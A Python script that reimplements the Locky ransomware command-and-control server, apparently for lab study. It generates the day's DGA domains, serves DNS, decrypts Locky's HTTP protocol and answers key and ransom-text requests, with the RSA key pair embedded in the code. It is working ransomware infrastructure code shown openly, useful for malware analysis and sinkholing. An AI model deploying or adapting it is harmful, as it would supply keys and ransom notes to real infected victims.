#!/usr/bin/python3.6

#
# C&C Reimplementation to Locky ransomware
# Author: Adrien Coueron
#

import datetime, argparse, subprocess, os, time, socket, threading
import dgaV2, dns, lockyHTTPRequestCipher, lockyHTTPResponseCipher

class CacRequestHandlerThread(threading.Thread):
	def __init__(self, ip, port, clientsocket):
		threading.Thread.__init__(self)
		self.ip = ip
		self.port = port
		self.clientsocket = clientsocket
		self.publicKey = b'MFswDQYJKoZIhvcNAQEBBQADSgAwRwJAYlHVsh4EEz0StbeINyZaq6px8lyinl8diZFGNUu9gATpSa9CJ84D5VL9FmV7pmiGspciMxS9OA9XA4NSqVvpDwIDAQAB'
		self.privateKey = b'MIIBOAIBAAJAYlHVsh4EEz0StbeINyZaq6px8lyinl8diZFGNUu9gATpSa9CJ84D5VL9FmV7pmiGspciMxS9OA9XA4NSqVvpDwIDAQABAkBZFTS+MhwXIlr1ctlkvsegisq7gduGC0BECPDIEVwdxTXrmMcWhM/cWjqdzy5P1zXQ/GDVUO1E3J38xhFJhjFhAiEAnxh4Pvhm00VR/MCJBYs5rPrfIS8cM0Dm7xPT6hzPWC0CIQCeNKti7oLXJ1UkuM3wzr9JSoPLwY2k5OwAkIcdkfLvqwIgO3fZEqilPtmNgO2zChh1kZwgpXXHk7zx1XHS55KnSm0CIB51E127f1L+joTAU1194BOzFcZ/X86UB99f87M8quF7AiAl9bpkX7obyU9qTZmSTzkLDLEmkWAE2M6mjEObIzvRJw=='
		self.text = 'Bonjour je suis un blaireau de ransomware qui ne chiffre rien. Du Coup je sers surtout à créer des wallpapers personnalisés. <3'
		self.httpSeparator = b'\r\n\r\n'

	def run(self): 
		try:
			req = self.clientsocket.recv(2048)
			print(req)
			headers = self.parseHeadersParams(req)
			plaintextBody = self.getPlaintextBody(req)
			requestParams = self.parseRequestParam(plaintextBody)
			print(requestParams)
			if(requestParams['act'] == b'getkey'):
				response = self.createResponseGetkey(headers, requestParams)
				print('Get pubkey request')
				self.clientsocket.send(response)
			elif(requestParams['act'] == b'gettext'):
				print('Get text request')
				response = self.createResponseGettext(headers, requestParams)
				self.clientsocket.send(response)
		except:
			print("Except: Packet malformed")

	def createResponseGettext(self, headers, requestParams):
		responseBody = lockyHTTPResponseCipher.encrypt(self.text.encode('utf-8'))
		httpHeaders = self.createHTTPHeaderResponse(headers, len(responseBody))
		return httpHeaders + responseBody + b'\r\n\r\n'

	def createResponseGetkey(self, headers, requestParams):
		responseBody = lockyHTTPResponseCipher.encrypt(self.publicKey)
		httpHeaders = self.createHTTPHeaderResponse(headers, len(responseBody))
		return httpHeaders + responseBody + b'\r\n\r\n'
	
	def createHTTPHeaderResponse(self, requestHeaders, bodyLength):
		responseHeader = '{} 200 OK\r\n'.format(requestHeaders['protocol'])
		responseHeader += 'Content-Length: {}\r\n\r\n'.format(bodyLength)
		return responseHeader.encode('utf-8')
		
	def parseHeadersParams(self, req):
		header = req[:req.find(self.httpSeparator)]
		params = {}
		headersList = header.split(b'\r\n')
		firstLine = headersList[0]
		del headersList[0]
		for el in map(lambda x: x.split(b': '), headersList):
			params[el[0].decode('utf-8')] = el[1]
		params['method'], params['ressource'], params['protocol'] = firstLine.split(b' ')
		return params

	def parseRequestParam(self, body):
		params = {}
		for el in map(lambda x: x.split(b'='), body.split(b'&')):
			params[el[0].decode('utf-8')] = el[1].replace(b'+', b' ')
		return params

	def getPlaintextBody(self, req):
		body = req[req.find(self.httpSeparator)+len(self.httpSeparator):]
		return lockyHTTPRequestCipher.decrypt(body)

class DNSThread(threading.Thread):
	def __init__(self, domainsList):
		threading.Thread.__init__(self)
		self.domainsList = domainsList

	def run(self): 
		dns.startDNS(domainsList)

def startDNS(domainsList):
	DNSThread(domainsList).start()

def startCaC():
	try:
		serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		serverSocket.bind(('', 80))
		while True:
			serverSocket.listen(10)
			clientSocket, (ip, port) = serverSocket.accept()
			requestHandler = CacRequestHandlerThread(ip, port, clientSocket)
			requestHandler.start()
	except:
		print("Except: Start C&C")
		serverSocket.close()


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-H", "--host",
	  help="Host IP")
	parser.add_argument("-c", "--config",
	  help="DGA's configuration")
	args = parser.parse_args()

	if args.host:
		hostIP = args.host
	else:
		hostIP = '192.168.56.1'

	if args.config:
		configDGA = args.config
	else:
		configDGA = 7

	date = datetime.datetime.now()
	day = date.day
	month = date.month
	year = date.year
	

	domainsList = dgaV2.dga(day, month, year)
	print(str(domainsList))
	startDNS(domainsList)
	startCaC()
